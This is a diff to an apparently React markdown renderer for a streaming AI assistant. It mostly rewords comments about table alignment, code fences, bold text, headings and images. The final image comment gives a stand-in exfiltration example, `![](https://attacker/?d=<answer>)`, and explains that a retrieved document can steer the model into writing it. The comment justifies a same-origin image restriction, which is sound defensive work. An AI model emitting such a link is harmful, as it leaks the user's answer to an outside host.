@@ -143,9 +143,9 @@ const MermaidDiagram = dynamic(
  *
  * react-markdown hands it to the custom `th`/`td` either as the legacy `align`
  * prop or as `style.textAlign` (which of the two depends on the mdast→hast
- * version in play), and the previous components read neither — so every column
- * of every table rendered left-aligned, and the right-aligned number columns
- * the agent deliberately writes (Werte, Breiten, Fristen) lost their alignment.
+ * version in play), so both are read. Reading neither would left-align every
+ * column, including the right-aligned number columns the agent deliberately
+ * writes (Werte, Breiten, Fristen).
  */
 function cellAlignClass(
   align: string | undefined,
@@ -174,8 +174,8 @@ function getTextFromChildren(node: ReactNode): string {
  * an unclosed fence to the end of its container, so the block the parser hands
  * over IS the half-written one. It is still open when it ends on the last line
  * of the text and that line is not a fence closing it. Counting ``` in the raw
- * text missed a `~~~` fence and one indented inside a list item, and drew those
- * from half-written source on every token. Only the last block can be open:
+ * text would miss a `~~~` fence and one indented inside a list item, and draw
+ * those from half-written source on every token. Only the last block can be open:
  * every fence before it is complete and may be drawn while the answer is still
  * arriving (ADR-0066).
  */
@@ -278,9 +278,10 @@ function openContainers(content: string): number {
 /**
  * Close a bold phrase the last line has opened and not yet closed, so it is
  * drawn bold from its first word instead of as a raw `**` until its partner
- * arrives. An answer that opens with its verdict in bold showed nothing for
- * 0.7 s (the paced reveal waited for the closer) or a raw `**` (stream audit,
- * 2026-09). Not inside an open fence or a code span, and not in a table row,
+ * arrives. Without this, an answer that opens with its verdict in bold would
+ * show nothing while the paced reveal waits for the closer, or a raw `**`
+ * showing in its place.
+ * Not inside an open fence or a code span, and not in a table row,
  * which the renderer draws cell by cell.
  */
 function closeOpenBold(content: string): string {
@@ -302,14 +303,13 @@ function closeOpenBold(content: string): string {
  * ## Why a context, and not a closure
  *
  * The overrides below are handed to react-markdown as COMPONENTS, and React
- * decides whether to keep or replace a subtree by the component's identity. The
- * overrides used to be built inside the renderer, closing over the heading ids,
- * the open fence and the slot renderer, all three of which change with every
- * streamed token. So every token minted a new `h2`, a new `code`, a new slot
- * component, and React unmounted and remounted the whole answer: a drawn diagram
- * went back to its skeleton and re-queued its parse behind the mermaid lock, and
- * a card that had grown into its place grew again (ADR-0066 draws both while
- * the answer is still arriving, so both were visible every token).
+ * decides whether to keep or replace a subtree by the component's identity. A
+ * closure over the heading ids, the open fence or the slot renderer would change
+ * with every streamed token, so every token would mint a new `h2`, a new `code`,
+ * a new slot component, and React would unmount and remount the whole answer: a
+ * drawn diagram would drop back to its skeleton and re-queue its parse behind
+ * the mermaid lock, and a card would grow into its place again (ADR-0066 draws
+ * both while the answer is still arriving).
  *
  * The overrides are therefore module-level and never change. What varies per
  * render travels through this context and is read INSIDE them, which re-renders
@@ -363,8 +363,8 @@ function useHeadingId(node: ExtraProps['node'], children: ReactNode): string {
 
 // A position a remark plugin marked for the surface to fill (see
 // `slot-context`). The renderer is read here, not captured: a surface's slot
-// renderer changes whenever its cards do, and capturing it made this a new
-// component on every such change.
+// renderer changes whenever its cards do, and capturing it would make this a
+// new component on every such change.
 function MarkdownSlot({ index }: { index?: string }) {
   const renderSlot = useMarkdownSlotRenderer()
   const position = Number(index)
@@ -382,8 +382,8 @@ function MarkdownCode({
   // Block code vs inline. The class alone cannot decide it: a BARE
   // fence (``` with no language — the fence the model actually writes
   // when it forgets the tag) reaches here with no className at all, and
-  // keying on the class rendered whole diagrams and listings as inline
-  // code, so `isMermaidFence`'s content sniff never even ran. The
+  // keying on the class would draw whole diagrams and listings as inline
+  // code, so `isMermaidFence`'s content sniff would never run. The
   // trailing newline is the discriminator remark itself provides: a
   // fenced block's text is always `value + '\n'`, an inline span can
   // never contain a newline.
@@ -473,9 +473,9 @@ function MarkdownH4({ children, node }: HeadingProps) {
 }
 
 // h5/h6 need a mapping too: Tailwind's preflight strips heading sizes
-// and weights, so an unmapped level rendered as plain body text — a
-// deeply structured answer (OIB guideline → section → clause) silently
-// lost its two lowest levels of hierarchy.
+// and weights, so an unmapped level renders as plain body text, and a
+// deeply structured answer (OIB guideline → section → clause) would
+// silently lose its two lowest levels of hierarchy.
 function MarkdownH5({ children, node }: HeadingProps) {
   const id = useHeadingId(node, children)
   return (
@@ -504,7 +504,7 @@ function MarkdownParagraph({ children }: React.ComponentPropsWithoutRef<'p'>) {
 }
 
 // `id` forwarded for the footnote list items, which the `[^n]` links
-// point at; without it every footnote link scrolled nowhere.
+// point at; without it every footnote link scrolls nowhere.
 function MarkdownListItem({ children, id, node }: React.ComponentPropsWithoutRef<'li'> & ExtraProps) {
   const { compact } = useMarkdownRenderState()
   const { active, muted } = useCaseMarks(node?.properties)
@@ -727,7 +727,7 @@ function MarkdownHeaderCell({ children, align, style, node }: React.ComponentPro
 function MarkdownCell({ children, align, style, node }: React.ComponentPropsWithoutRef<'td'> & ExtraProps) {
   // Marked by `rehypeTableShape`, which knows the cell's column: only a Status
   // column's word is a mark. Read off the cell's text alone, „open" in a
-  // Bemerkung column became a chip.
+  // Bemerkung column would become a chip.
   const properties = node?.properties ?? {}
   const t = useTranslations('common')
   const cases = useCasesDecision()
@@ -868,7 +868,7 @@ const MARKDOWN_COMPONENTS = {
   p: MarkdownParagraph,
   // Lists. GFM task lists arrive with `contains-task-list` /
   // `task-list-item` classes; forcing `list-disc` on them drew a bullet
-  // NEXT TO each checkbox, so a checklist read as two markers per row.
+  // NEXT TO each checkbox, so a checklist would read as two markers per row.
   ul: MarkdownUnorderedList,
   ol: MarkdownOrderedList,
   li: MarkdownListItem,
@@ -915,9 +915,9 @@ const MARKDOWN_COMPONENTS = {
   [COMPARE_ROW_TAG]: CompareRow,
   [COMPARE_LABEL_TAG]: CompareLabel,
   [COMPARE_VALUE_TAG]: CompareValue,
-  // Images: bounded, softened, and lazy. Without the mapping an image
-  // rendered at natural size with square corners and loaded eagerly —
-  // and a broken source showed the browser's raw glyph full-bleed.
+  // Images: bounded, softened, and lazy. Without the mapping an image would
+  // render at natural size with square corners and load eagerly, and a broken
+  // source would show the browser's raw glyph full-bleed.
   //
   // Only an image this origin serves is loaded. The text is the model's, and a
   // retrieved document can steer it into `![](https://attacker/?d=<answer>)`,
